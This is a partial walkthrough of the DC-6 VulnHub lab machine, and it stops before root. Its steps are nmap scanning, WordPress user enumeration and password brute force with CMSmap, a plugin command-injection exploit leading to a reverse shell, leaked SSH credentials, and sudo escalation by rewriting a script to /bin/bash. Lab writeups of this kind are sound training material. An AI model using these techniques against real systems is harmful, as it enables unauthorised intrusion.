# DC: 6 - https://www.vulnhub.com/entry/dc-6,315/

First of all things I do before everything is nmap scan.

**nmap -T4 -sC -sV -p- -v 192.168.1.102**

```PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 5.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Wordy &#8211; Just another WordPress site
```
From the results we can see that this is Wordpress website and we can visit it right away. 
On the opening website redirected us to http://wordy/ and we should change out **/etc/hosts**. 
For Wordpress scan I am using this awesome tool **https://github.com/Dionach/CMSmap**. 
And after the scan is done, we can see that there are several users:
```
[M] admin
[M] graham
[M] jens
[M] mark
[M] sarah
```
 I saved them for a later use and continued to poke the website. I couldn't find anything so I started bruteforce. 
 Author gave us a little "hint" `cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt` so we used it. 
 Command I used further was ```python3 /opt/CMSmap/cmsmap.py http://wordy/ --usr /home/andev/usernames.txt --psw /home/andev/passwords.txt```
 and after some time it found the correct password. 
 
 **[H] Valid Credentials! Username: mark Password: helpdesk01**
 
 As we logged in we were greeted with classic Wordpress dashboard but one plugin catched my eye. 
 It was **Activity monitor**. I searched it using searchsploit and this came out 
 **WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                           | exploits/php/webapps/45274.html**. 
 This was exploit I have never seen in my life but it looked like a DVWA RCE challenge. I setup reverse shell and got in !
  The first thing I checked was home directories for all users and only one thing was helpful so far.
The **things-to-do.txt** file which contained 
```
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

I tested these credentials against SSH service we got and I got in. Next thing I did was to run **sudo -l** and results were useful.

```
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```
This means that we can execute **backups.sh** as jens. Since this file belongs to group **devs** and jens and graham are in that group, it means that we can edit this file.
**echo "/bin/bash" > backups.sh**. 
Running ``` sudo -u jens ./backups.sh ``` we became jens.

Once again I ran **sudo -l** and got 
```
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```
this means that we can run nmap as root ! 
Unfortunaltely I was stuck with this since the old way in using nmap to priv esc didn't work because this new version. I tried **nmap --interactive** but it didn't work.
I am still stuck on this, once i find a way i will finish this writeup.
